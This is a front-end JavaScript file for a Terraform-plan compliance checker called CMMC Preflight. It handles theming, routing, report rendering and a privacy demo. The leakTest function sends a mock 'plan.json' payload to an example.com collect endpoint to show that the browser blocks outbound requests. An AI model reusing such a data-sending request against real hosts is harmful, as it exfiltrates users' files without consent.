// Page behaviour: theme, section routing, the live preview, and the interactive report.
// Nothing in this file (or anywhere in CMMC Preflight) sends data over the network.
import { parsePlan, parsePlanText, PlanError } from './parser.js';
import { buildReport } from './report.js';
import { checks } from './checks/index.js';
import { content, STATUS_LABEL, DISCLAIMER } from './content.js';
import { FAMILIES, TOTAL_REQUIREMENTS, familyOf } from './families.js';
import insecurePlan from '../samples/insecure-plan.js';
import fixedPlan from '../samples/fixed-plan.js';

const $ = (id) => document.getElementById(id);
const STATUSES = ['fail', 'unknown', 'pass', 'na'];

// Small DOM builder. Text always goes in through textContent, so names taken from a plan
// file can never be interpreted as HTML.
function h(tag, props = {}, ...children) {
  const el = document.createElement(tag);
  for (const [key, value] of Object.entries(props)) {
    if (value === null || value === undefined || value === false) continue;
    if (key === 'class') el.className = value;
    else if (key === 'text') el.textContent = value;
    else if (key.startsWith('on')) el.addEventListener(key.slice(2), value);
    else el.setAttribute(key, value === true ? '' : value);
  }
  for (const child of children.flat()) {
    if (child === null || child === undefined || child === false) continue;
    el.append(child instanceof Node ? child : document.createTextNode(String(child)));
  }
  return el;
}

const two = (n) => String(n).padStart(2, '0');
const reduceMotion = () => window.matchMedia('(prefers-reduced-motion: reduce)').matches;

// localStorage is per-browser and can throw; it only ever holds the theme choice here.
const store = {
  get(key) {
    try {
      return localStorage.getItem(key);
    } catch {
      return null;
    }
  },
  set(key, value) {
    try {
      localStorage.setItem(key, value);
    } catch {
      /* private browsing, or storage is full */
    }
  },
};

// ---------- Toasts ----------

function toast(message) {
  const el = h('div', { class: 'toast', text: message });
  $('toasts').append(el);
  setTimeout(() => el.classList.add('is-out'), 2200);
  setTimeout(() => el.remove(), 2600);
}

// ---------- Theme ----------

const THEMES = ['auto', 'light', 'dark'];
const THEME_TITLE = {
  auto: 'Theme: follows your system',
  light: 'Theme: light',
  dark: 'Theme: dark',
};
let theme = THEMES.includes(store.get('theme')) ? store.get('theme') : 'auto';

function applyTheme() {
  const root = document.documentElement;
  if (theme === 'auto') root.removeAttribute('data-theme');
  else root.setAttribute('data-theme', theme);
  root.setAttribute('data-theme-choice', theme);
  $('theme-toggle').title = THEME_TITLE[theme];
}

function cycleTheme() {
  theme = THEMES[(THEMES.indexOf(theme) + 1) % THEMES.length];
  store.set('theme', theme);
  applyTheme();
  toast(THEME_TITLE[theme]);
}

$('theme-toggle').addEventListener('click', cycleTheme);

// ---------- Sections ----------

const VIEWS = ['overview', 'check', 'checks', 'security', 'limits'];

function showView(name) {
  const view = VIEWS.includes(name) ? name : 'overview';
  for (const id of VIEWS) $(`view-${id}`).hidden = id !== view;
  for (const link of $('tabs').querySelectorAll('a')) {
    const current = link.dataset.view === view;
    link.classList.toggle('is-current', current);
    if (current) link.setAttribute('aria-current', 'page');
    else link.removeAttribute('aria-current');
  }
  document.documentElement.scrollTop = 0;
  document.body.scrollTop = 0;
  closeNav();
  if (view === 'overview') playRun();
  if (view === 'security') refreshSecurity();
}

// ---------- Mobile menu ----------

const navToggle = $('nav-toggle');
function closeNav() {
  document.body.classList.remove('nav-open');
  navToggle.setAttribute('aria-expanded', 'false');
}
navToggle.addEventListener('click', () => {
  const open = document.body.classList.toggle('nav-open');
  navToggle.setAttribute('aria-expanded', open ? 'true' : 'false');
});

const currentView = () => location.hash.replace(/^#/, '') || 'overview';
const routeFromHash = () => showView(currentView());
window.addEventListener('hashchange', routeFromHash);

// ---------- Progress ring ----------

const RING = 2 * Math.PI * 52;

function setRing(circle, fraction) {
  circle.style.strokeDasharray = `${RING}`;
  circle.style.strokeDashoffset = `${RING * (1 - fraction)}`;
}

// ---------- Overview: live preview ----------

const previewPlans = { weak: insecurePlan, fixed: fixedPlan };
let previewWhich = 'weak';
let runToken = 0;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function setStep(name, value, state) {
  const li = document.querySelector(`#run-steps [data-step="${name}"]`);
  if (!li) return;
  li.dataset.state = state;
  li.querySelector('.run-value').textContent = value;
}

function resetRun() {
  for (const li of document.querySelectorAll('#run-steps li')) {
    li.dataset.state = 'idle';
    li.querySelector('.run-value').textContent = '';
  }
  $('preview-chips').replaceChildren();
  $('preview-num').textContent = '0';
  setRing($('preview-arc'), 0);
}

// Runs the real parser and the real checks, one step at a time, so the panel shows the
// actual tool working rather than a recording of it.
async function playRun() {
  const token = ++runToken;
  const quick = reduceMotion();
  const pause = (ms) => (quick ? Promise.resolve() : sleep(ms));
  resetRun();

  const plan = previewPlans[previewWhich];
  const bytes = JSON.stringify(plan).length;

  setStep('read', '', 'busy');
  await pause(320);
  if (token !== runToken) return;
  setStep('read', `${(bytes / 1024).toFixed(0)} KB, locally`, 'done');

  setStep('parse', '', 'busy');
  await pause(300);
  if (token !== runToken) return;
  const { resources } = parsePlan(plan);
  setStep('parse', `${resources.length} resources`, 'done');

  setStep('run', '', 'busy');
  const report = buildReport(resources);
  const list = $('preview-chips');
  for (const check of report.checks) {
    if (token !== runToken) return;
    list.append(
      h('li', { class: 'chip', 'data-status': check.status, title: `${check.title}: ${STATUS_LABEL[check.status]}` },
        h('span', { class: 'dot', 'aria-hidden': 'true' }),
        h('span', { class: 'chip-text', text: check.title }),
      ),
    );
    const passedSoFar = report.checks
      .slice(0, list.children.length)
      .filter((c) => c.status === 'pass').length;
    $('preview-num').textContent = String(passedSoFar);
    setRing($('preview-arc'), report.applicable ? passedSoFar / report.applicable : 0);
    await pause(90);
  }
  if (token !== runToken) return;
  const arc = $('preview-arc');
  arc.dataset.status = report.counts.fail > 0 ? 'fail' : report.counts.unknown > 0 ? 'unknown' : 'pass';
  setStep('run', `${report.passed} of ${report.applicable} passed`, 'done');

  setStep('net', '', 'busy');
  await pause(260);
  if (token !== runToken) return;
  setStep('net', `${crossOriginRequests()} bytes`, 'done');
}

for (const button of document.querySelectorAll('[data-preview]')) {
  button.addEventListener('click', () => {
    previewWhich = button.dataset.preview;
    for (const other of document.querySelectorAll('[data-preview]')) {
      other.classList.toggle('is-on', other === button);
    }
    playRun();
  });
}
$('replay').addEventListener('click', playRun);

// ---------- Overview: count-up stats ----------

function countUpStats() {
  if (reduceMotion()) return;
  for (const el of document.querySelectorAll('[data-count-to]')) {
    const target = Number(el.dataset.countTo);
    const prefix = el.dataset.prefix ?? '';
    const suffix = el.dataset.suffix ?? '';
    const steps = 26;
    let i = 0;
    const tick = () => {
      i += 1;
      const value = Math.round((target * i) / steps);
      el.textContent = `${prefix}${value.toLocaleString('en-US')}${suffix}`;
      if (i < steps) requestAnimationFrame(tick);
    };
    requestAnimationFrame(tick);
  }
}

// ---------- The checks table ----------

function renderChecksTable() {
  $('checks-table').querySelector('tbody').replaceChildren(
    ...checks.map((check, index) => {
      const entry = content[check.id];
      return h('tr', {},
        h('td', { class: 'cell-num', text: two(index + 1) }),
        h('th', { scope: 'row', text: entry.title }),
        h('td', { text: entry.why }),
        h('td', {}, entry.requirements.map((r) => h('span', { class: 'req', text: r }))),
      );
    }),
  );
}

// ---------- NIST coverage ----------

const coveredRequirements = new Set(
  checks.flatMap((check) => content[check.id].requirements),
);

function renderCoverage() {
  // One square per requirement, grouped family by family, in order.
  const squares = [];
  for (const family of FAMILIES) {
    for (let i = 1; i <= family.count; i += 1) {
      const id = `${family.prefix}.${i}`;
      const on = coveredRequirements.has(id);
      squares.push(h('span', {
        class: `sq${on ? ' on' : ''}`,
        title: on ? `${id} — checked here` : `${id} — ${family.name}`,
      }));
    }
  }
  $('coverage').replaceChildren(...squares);
  $('coverage-count').textContent = `${coveredRequirements.size} of ${TOTAL_REQUIREMENTS} requirements`;

  const perFamily = new Map(FAMILIES.map((f) => [f.code, 0]));
  for (const id of coveredRequirements) {
    const family = familyOf(id);
    if (family) perFamily.set(family.code, perFamily.get(family.code) + 1);
  }

  $('families-table').querySelector('tbody').replaceChildren(
    ...FAMILIES.map((family) => {
      const hit = perFamily.get(family.code);
      return h('tr', { class: hit > 0 ? 'is-covered' : null },
        h('th', { scope: 'row', text: family.name }),
        h('td', {}, h('span', { class: 'req', text: family.code })),
        h('td', { class: 'cell-num', text: String(family.count) }),
        h('td', { class: 'cell-num' },
          hit > 0
            ? h('span', { class: 'pill', 'data-status': 'pass', text: String(hit) })
            : h('span', { class: 'cell-dash', text: '0' }),
        ),
        h('td', { text: family.evidence === 'some' ? 'Partly' : 'No' }),
      );
    }),
  );
}

// ---------- Security: live proof ----------

// Requests this page made to any other origin, read from the browser's own log.
function crossOriginRequests() {
  try {
    return performance
      .getEntriesByType('resource')
      .filter((entry) => new URL(entry.name, location.href).origin !== location.origin).length;
  } catch {
    return 0;
  }
}

function refreshSecurity() {
  const count = crossOriginRequests();
  $('net-count').textContent = String(count);
  $('proof-net').dataset.state = count === 0 ? 'good' : 'bad';
  $('net-note').textContent = count === 0
    ? 'Counted live from this page\u2019s own performance log. Nothing has left this browser.'
    : 'Counted live. Something loaded from another origin, which should not happen here.';

  let entries = [];
  try {
    entries = performance.getEntriesByType('resource');
  } catch {
    entries = [];
  }
  const rows = entries.map((entry) => {
    const url = new URL(entry.name, location.href);
    const own = url.origin === location.origin;
    const size = entry.transferSize || entry.encodedBodySize || 0;
    return h('tr', {},
      h('th', { scope: 'row', text: url.pathname.replace(/^\//, '') || '/' }),
      h('td', {}, h('span', { class: 'pill', 'data-status': own ? 'pass' : 'fail', text: own ? 'This site' : url.host })),
      h('td', { class: 'cell-num', text: size ? `${(size / 1024).toFixed(1)} KB` : '\u2014' }),
    );
  });
  $('resources-table').querySelector('tbody').replaceChildren(
    ...(rows.length > 0 ? rows : [h('tr', {}, h('td', { colspan: '3', text: 'Your browser did not expose a resource log.' }))]),
  );
}

// Attempts a real outbound request so the viewer can watch the browser refuse it.
async function leakTest() {
  const result = $('leak-result');
  const panel = $('proof-test');
  result.textContent = 'Attempting to send "plan.json" to example.com\u2026';
  panel.dataset.state = 'busy';
  const before = crossOriginRequests();
  try {
    await fetch('https://example.com/collect?payload=plan.json', { mode: 'no-cors' });
    const after = crossOriginRequests();
    if (after > before) {
      panel.dataset.state = 'bad';
      result.textContent = 'The request went out. On the deployed site the policy blocks this.';
    } else {
      panel.dataset.state = 'good';
      result.textContent = 'Blocked. The browser refused the connection and nothing was sent.';
    }
  } catch (error) {
    panel.dataset.state = 'good';
    result.textContent = `Blocked. The browser refused the connection: ${error.name}. Nothing was sent.`;
  }
  refreshSecurity();
  toast('Outbound request blocked');
}

$('leak-test').addEventListener('click', leakTest);

// ---------- Report state ----------

let report = null;
let source = null;
let activeFilter = 'all';
let query = '';

// ---------- Summary rail ----------

function renderSummary() {
  const bar = h('div', {
    class: 'bar',
    role: 'img',
    'aria-label': STATUSES.map((s) => `${report.counts[s]} ${STATUS_LABEL[s].toLowerCase()}`).join(', '),
  });
  for (const status of STATUSES) {
    if (report.counts[status] === 0) continue;
    const segment = h('span', { class: 'bar-seg', 'data-status': status });
    segment.style.flexGrow = String(report.counts[status]);
    bar.append(segment);
  }

  // SVG elements only render when created in the SVG namespace, so build the ring by hand.
  const ring = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
  ring.setAttribute('viewBox', '0 0 120 120');
  ring.setAttribute('class', 'ring');
  ring.setAttribute('role', 'img');
  ring.setAttribute('aria-label', `${report.passed} of ${report.applicable} checks passed`);
  for (const [cls, extra] of [['ring-track', {}], ['ring-value', { 'stroke-linecap': 'round' }]]) {
    const c = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
    c.setAttribute('class', cls);
    c.setAttribute('cx', '60');
    c.setAttribute('cy', '60');
    c.setAttribute('r', '52');
    c.setAttribute('fill', 'none');
    c.setAttribute('stroke-width', '12');
    for (const [k, v] of Object.entries(extra)) c.setAttribute(k, v);
    ring.append(c);
  }
  const arc = ring.querySelector('.ring-value');
  setRing(arc, report.applicable ? report.passed / report.applicable : 0);
  arc.dataset.status = report.counts.fail > 0 ? 'fail' : report.counts.unknown > 0 ? 'unknown' : 'pass';

  $('summary').replaceChildren(
    h('h2', { id: 'summary-heading', text: 'Result' }),
    h('div', { class: 'ring-wrap ring-wrap-lg' },
      ring,
      h('div', { class: 'ring-centre' },
        h('span', { class: 'ring-num', text: String(report.passed) }),
        h('span', { class: 'ring-of', text: `of ${report.applicable}` }),
      ),
    ),
    h('p', {
      class: 'score-label',
      text: report.counts.na > 0
        ? `checks passed. ${report.counts.na} did not apply to this plan.`
        : 'checks passed',
    }),
    bar,
    h('ul', { class: 'legend' },
      STATUSES.map((status) =>
        h('li', { 'data-status': status },
          h('span', { class: 'dot', 'aria-hidden': 'true' }),
          h('span', { class: 'legend-label', text: STATUS_LABEL[status] }),
          h('span', { class: 'legend-count', text: String(report.counts[status]) }),
        ),
      ),
    ),
    h('dl', { class: 'meta' },
      h('dt', { text: 'Plan' }), h('dd', { text: source.label }),
      h('dt', { text: 'Resources read' }), h('dd', { text: String(source.meta.total) }),
      source.meta.terraformVersion
        ? [h('dt', { text: 'Terraform' }), h('dd', { text: source.meta.terraformVersion })]
        : null,
      h('dt', { text: 'Checked' }),
      h('dd', { text: new Date().toLocaleDateString(undefined, { year: 'numeric', month: 'short', day: 'numeric' }) }),
      h('dt', { text: 'Standard' }), h('dd', { text: 'NIST SP 800-171 Rev 2' }),
    ),
    h('div', { class: 'rail-actions' },
      h('button', { type: 'button', class: 'button button-primary', onclick: printReport, text: 'Print or save as PDF' }),
      h('button', { type: 'button', class: 'button', onclick: copyReport, text: 'Copy report' }),
      h('button', { type: 'button', class: 'button', onclick: downloadReport, text: 'Download .md' }),
    ),
  );
}

function printReport() {
  for (const d of document.querySelectorAll('.check details')) d.open = true;
  try {
    window.print();
  } catch {
    toast('This preview cannot print. Try the deployed site.');
  }
}

// ---------- Report as Markdown ----------

function reportMarkdown() {
  const lines = [
    '# CMMC Preflight report',
    '',
    `- Plan: ${source.label}`,
    `- Resources read: ${source.meta.total}`,
    `- Checked: ${new Date().toISOString().slice(0, 10)}`,
    `- Result: ${report.passed} of ${report.applicable} checks passed`,
    '',
  ];
  for (const check of report.ordered) {
    lines.push(`## ${two(check.number)}. ${check.title} — ${STATUS_LABEL[check.status]}`);
    lines.push('');
    lines.push(`NIST SP 800-171 Rev 2: ${check.requirements.join(', ')}`);
    lines.push('');
    for (const f of check.findings) {
      lines.push(`- ${f.text}${f.resource ? ` (\`${f.resource}\`)` : ''}`);
    }
    lines.push('');
    lines.push(`**Why it matters.** ${check.why}`);
    lines.push('');
    lines.push(`**What this does not prove.** ${check.limits}`);
    lines.push('');
    if (check.status === 'fail' || check.status === 'unknown') {
      lines.push('**How to fix it.**', '', '```hcl', check.fix, '```', '');
    }
  }
  lines.push('---', '', DISCLAIMER, '');
  return lines.join('\n');
}

async function copyReport() {
  try {
    await navigator.clipboard.writeText(reportMarkdown());
    toast('Report copied as Markdown');
  } catch {
    toast('Your browser blocked the copy');
  }
}

function downloadReport() {
  try {
    const blob = new Blob([reportMarkdown()], { type: 'text/markdown' });
    const url = URL.createObjectURL(blob);
    const a = h('a', { href: url, download: 'cmmc-preflight-report.md' });
    document.body.append(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
    toast('Saved cmmc-preflight-report.md');
  } catch {
    toast('Download blocked here. Use Copy report instead.');
  }
}

// ---------- Findings ----------

function renderCheck(check) {
  const showFix = check.status === 'fail' || check.status === 'unknown';
  const copy = h('button', { type: 'button', class: 'button button-small', text: 'Copy' });
  copy.addEventListener('click', async (event) => {
    event.preventDefault();
    try {
      await navigator.clipboard.writeText(check.fix);
      copy.textContent = 'Copied';
      toast('Fix copied');
    } catch {
      copy.textContent = 'Select and copy';
    }
    setTimeout(() => {
      copy.textContent = 'Copy';
    }, 1800);
  });

  const haystack = [
    check.title,
    check.why,
    check.requirements.join(' '),
    ...check.findings.map((f) => `${f.text} ${f.resource ?? ''}`),
  ].join(' ').toLowerCase();

  return h('li', { class: 'check', 'data-status': check.status, 'data-haystack': haystack },
    h('details', { open: check.status === 'fail' || check.status === 'unknown' },
      h('summary', {},
        h('span', { class: 'num', text: two(check.number), 'aria-hidden': 'true' }),
        h('span', { class: 'check-title', text: check.title }),
        h('span', { class: 'pill', 'data-status': check.status, text: STATUS_LABEL[check.status] }),
        h('span', { class: 'reqs', 'aria-label': `Requirements ${check.requirements.join(', ')}` },
          check.requirements.map((r) => h('span', { class: 'req', text: r })),
        ),
        h('span', { class: 'chev', 'aria-hidden': 'true' }),
      ),
      h('div', { class: 'check-body' },
        h('ul', { class: 'found' },
          check.findings.map((f) =>
            h('li', { 'data-status': f.status },
              h('span', { class: 'dot', 'aria-hidden': 'true' }),
              h('div', {},
                h('p', { text: f.text }),
                f.resource ? h('code', { class: 'address', text: f.resource }) : null,
              ),
            ),
          ),
        ),
        h('div', { class: 'explain' },
          h('section', {}, h('h3', { text: 'Why it matters' }), h('p', { text: check.why })),
          h('section', {}, h('h3', { text: 'What this does not prove' }), h('p', { text: check.limits })),
        ),
        showFix
          ? h('section', { class: 'fix' },
              h('div', { class: 'fix-head' }, h('h3', { text: 'How to fix it' }), copy),
              h('pre', { tabindex: '0' }, h('code', { text: check.fix })),
            )
          : null,
      ),
    ),
  );
}

function renderFilters() {
  const options = [['all', 'All', report.total], ...STATUSES.map((s) => [s, STATUS_LABEL[s], report.counts[s]])];
  $('filters').replaceChildren(
    ...options.map(([value, label, count]) =>
      h('button', {
        type: 'button',
        class: `filter${value === activeFilter ? ' is-on' : ''}`,
        'data-status': value === 'all' ? null : value,
        disabled: count === 0 && value !== 'all',
        'aria-pressed': value === activeFilter ? 'true' : 'false',
        onclick: () => {
          activeFilter = value;
          renderFilters();
          applyFilter();
        },
      },
        value === 'all' ? null : h('span', { class: 'dot', 'aria-hidden': 'true' }),
        h('span', { text: label }),
        h('span', { class: 'filter-count', text: String(count) }),
      ),
    ),
  );
}

function applyFilter() {
  let shown = 0;
  for (const el of $('findings').children) {
    const statusOk = activeFilter === 'all' || el.dataset.status === activeFilter;
    const queryOk = query === '' || el.dataset.haystack.includes(query);
    const show = statusOk && queryOk;
    el.hidden = !show;
    if (show) shown += 1;
  }
  $('empty').hidden = shown > 0;
}

function renderReport() {
  renderSummary();
  $('findings').replaceChildren(...report.ordered.map(renderCheck));
  const problems = report.counts.fail;
  $('results-sub').textContent =
    problems > 0
      ? `${problems} ${problems === 1 ? 'check needs' : 'checks need'} fixing. Problems are listed first.`
      : report.counts.unknown > 0
        ? 'Nothing failed, but some checks could not be determined from the plan.'
        : 'Nothing in this plan failed the ten checks.';
  $('disclaimer').textContent = DISCLAIMER;
  renderFilters();
  applyFilter();
}

function showNotice(kind, title, text) {
  $('notice').replaceChildren(
    h('div', { class: `notice notice-${kind}` }, h('strong', { text: title }), h('span', { text: text })),
  );
}

// ---------- Loading plans ----------

function run(parse, label, sample) {
  try {
    const { resources, meta } = parse();
    report = buildReport(resources);
    source = { label, meta };
    activeFilter = 'all';
    renderReport();
    if (sample) showNotice('sample', 'This is a sample plan.', 'Drop your own plan.json on the left to check it.');
    else $('notice').replaceChildren();
    return true;
  } catch (error) {
    const message = error instanceof PlanError ? error.message : 'Something went wrong reading this file.';
    showNotice('error', 'We could not read that file.', `${message} The report below is unchanged.`);
    if (!(error instanceof PlanError)) console.error(error);
    return false;
  }
}

async function loadFile(file) {
  if (!file) return;
  const text = await file.text();
  if (currentView() !== 'check') location.hash = 'check';
  if (run(() => parsePlanText(text), file.name, false)) {
    toast(`${file.name}: ${report.passed} of ${report.applicable} passed`);
  }
}

const input = $('plan-file');
input.addEventListener('change', () => {
  loadFile(input.files[0]);
  input.value = '';
});

// Dropping anywhere on the page works, with a full-window cue.
const veil = $('dropveil');
let dragDepth = 0;
const carriesFile = (event) => Array.from(event.dataTransfer?.types ?? []).includes('Files');

window.addEventListener('dragenter', (event) => {
  if (!carriesFile(event)) return;
  event.preventDefault();
  dragDepth += 1;
  veil.hidden = false;
});
window.addEventListener('dragover', (event) => {
  if (carriesFile(event)) event.preventDefault();
});
window.addEventListener('dragleave', () => {
  dragDepth = Math.max(0, dragDepth - 1);
  if (dragDepth === 0) veil.hidden = true;
});
window.addEventListener('drop', (event) => {
  event.preventDefault();
  dragDepth = 0;
  veil.hidden = true;
  const file = event.dataTransfer?.files?.[0];
  if (file) loadFile(file);
});

$('sample-insecure').addEventListener('click', () => run(() => parsePlan(insecurePlan), 'Sample with problems', true));
$('sample-fixed').addEventListener('click', () => run(() => parsePlan(fixedPlan), 'Sample after fixes', true));

// ---------- Toolbar ----------

const search = $('search');
search.addEventListener('input', () => {
  query = search.value.trim().toLowerCase();
  applyFilter();
});

const setAllOpen = (open) => {
  for (const d of $('findings').querySelectorAll('details')) d.open = open;
};
$('expand-all').addEventListener('click', () => setAllOpen(true));
$('collapse-all').addEventListener('click', () => setAllOpen(false));

// ---------- Shortcut help ----------

const sheet = $('help-sheet');
const openHelp = () => {
  sheet.hidden = false;
  $('help-close').focus();
};
const closeHelp = () => {
  sheet.hidden = true;
  $('help-toggle').focus();
};
$('help-toggle').addEventListener('click', openHelp);
$('help-close').addEventListener('click', closeHelp);
sheet.addEventListener('click', (event) => {
  if (event.target === sheet) closeHelp();
});

// ---------- Keyboard ----------

document.addEventListener('keydown', (event) => {
  if (event.metaKey || event.ctrlKey || event.altKey) return;
  const typing = /^(INPUT|TEXTAREA|SELECT)$/.test(event.target.tagName);

  if (event.key === 'Escape') {
    if (document.body.classList.contains('nav-open')) closeNav();
    else if (!sheet.hidden) closeHelp();
    else if (typing && event.target === search) {
      search.value = '';
      query = '';
      applyFilter();
      search.blur();
    }
    return;
  }
  if (typing) return;

  if (event.key === '/') {
    event.preventDefault();
    // The section is revealed by the hashchange event, which runs after this handler,
    // so focus has to wait for it: a hidden input cannot take focus.
    if (currentView() !== 'check') location.hash = 'check';
    requestAnimationFrame(() => search.focus());
    return;
  }
  if (event.key === '?') {
    event.preventDefault();
    openHelp();
    return;
  }
  const index = Number(event.key);
  if (index >= 1 && index <= VIEWS.length) {
    location.hash = VIEWS[index - 1];
    return;
  }
  const key = event.key.toLowerCase();
  if (key === 'e') setAllOpen(true);
  else if (key === 'c') setAllOpen(false);
  else if (key === 't') cycleTheme();
});

// ---------- Start ----------

applyTheme();
renderChecksTable();
renderCoverage();
$('statement').textContent = DISCLAIMER;
// The check section opens in a working state, showing the sample with problems.
run(() => parsePlan(insecurePlan), 'Sample with problems', true);
routeFromHash();
countUpStats();
refreshSecurity();
